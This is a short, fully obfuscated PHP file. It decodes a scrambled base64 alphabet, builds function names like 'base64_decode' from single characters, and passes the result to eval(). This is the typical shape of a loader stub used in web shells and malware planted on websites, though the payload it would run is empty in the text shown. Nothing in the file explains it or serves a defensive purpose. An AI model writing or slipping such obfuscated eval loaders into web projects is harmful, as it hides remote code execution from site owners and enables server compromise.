<?php define('qtzmkj0311',__FILE__);$nzzism=base64_decode("bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqd2Z1Slp2UnBDRm1oSXhLcmJCbmRpbGpnb0hHc1VEUHRlUVdOTVlFTGtxT1RTYXlYVnpjQQ==");$YEpmSu=$nzzism[3].$nzzism[6].$nzzism[33].$nzzism[30];$FzoUNz=$nzzism[33].$nzzism[10].$nzzism[24].$nzzism[10].$nzzism[24];$nNngYP=$FzoUNz[0].$nzzism[18].$nzzism[3].$FzoUNz[0].$FzoUNz[1].$nzzism[24];$uTHPkF=$nzzism[7].$nzzism[13];$YEpmSu.=$nzzism[22].$nzzism[36].$nzzism[29].$nzzism[26].$nzzism[30].$nzzism[32].$nzzism[35].$nzzism[26].$nzzism[30];eval($YEpmSu(""));?>